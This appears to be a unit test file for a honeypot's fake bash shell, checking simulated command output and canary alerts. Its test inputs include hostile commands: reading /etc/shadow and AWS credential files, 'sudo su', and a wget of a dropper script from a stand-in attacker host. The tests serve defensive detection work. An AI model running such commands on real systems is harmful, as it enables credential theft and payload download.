"""Unit tests for simulated bash/sh command execution engine."""

import unittest

from cloud_honeypot_ai.core.fake_shell import FakeShell


class TestFakeShell(unittest.TestCase):

    def setUp(self):
        self.shell = FakeShell(username="ubuntu")

    def test_basic_identity_commands(self):
        res_whoami = self.shell.execute("whoami")
        self.assertEqual(res_whoami.stdout.strip(), "ubuntu")

        res_id = self.shell.execute("id")
        self.assertIn("uid=1000(ubuntu)", res_id.stdout)

        res_pwd = self.shell.execute("pwd")
        self.assertEqual(res_pwd.stdout.strip(), "/home/ubuntu")

    def test_uname_system_info(self):
        res = self.shell.execute("uname -a")
        self.assertIn("Linux", res.stdout)
        self.assertIn("x86_64", res.stdout)

    def test_navigation_and_directory(self):
        res_cd = self.shell.execute("cd /etc")
        self.assertEqual(self.shell.cwd, "/etc")

        res_ls = self.shell.execute("ls")
        self.assertIn("passwd", res_ls.stdout)

        res_cat = self.shell.execute("cat passwd")
        self.assertIn("root:x:0:0", res_cat.stdout)

    def test_canary_detection_via_shell(self):
        res = self.shell.execute("cat /etc/shadow")
        self.assertIsNotNone(res.canary_triggered)
        self.assertEqual(res.canary_triggered, "HONEY_SHADOW_EXFILTRATION")

        res_aws = self.shell.execute("cat /home/ubuntu/.aws/credentials")
        self.assertEqual(res_aws.canary_triggered, "CANARY_AWS_CREDENTIAL_STOLEN")

    def test_tool_transfer_curl_wget(self):
        res = self.shell.execute("wget http://attacker.evil/dropper.sh")
        self.assertIn("200 OK", res.stdout)
        self.assertIn("dropper.sh", res.stdout)
        self.assertIn("DOWNLOADED_ATTACKER_PAYLOAD", res.canary_triggered)
        # Verify file saved in /tmp
        self.assertTrue(self.shell.fs.exists("/tmp/dropper.sh"))

    def test_privilege_escalation_sudo(self):
        res = self.shell.execute("sudo su")
        self.assertEqual(self.shell.username, "root")
        self.assertEqual(self.shell.cwd, "/root")
        self.assertEqual(res.canary_triggered, "PRIVILEGE_ESCALATION_TO_ROOT")

        res_whoami = self.shell.execute("whoami")
        self.assertEqual(res_whoami.stdout.strip(), "root")

    def test_chained_commands(self):
        res = self.shell.execute("whoami && pwd")
        self.assertIn("ubuntu", res.stdout)
        self.assertIn("/home/ubuntu", res.stdout)

    def test_output_redirection(self):
        res = self.shell.execute("echo 'hello hacker' > /tmp/note.txt")
        content, _ = self.shell.fs.read_file("/tmp/note.txt")
        self.assertEqual(content.strip(), "hello hacker")

    def test_exit_command(self):
        res = self.shell.execute("exit")
        self.assertTrue(res.should_exit)


if __name__ == "__main__":
    unittest.main()
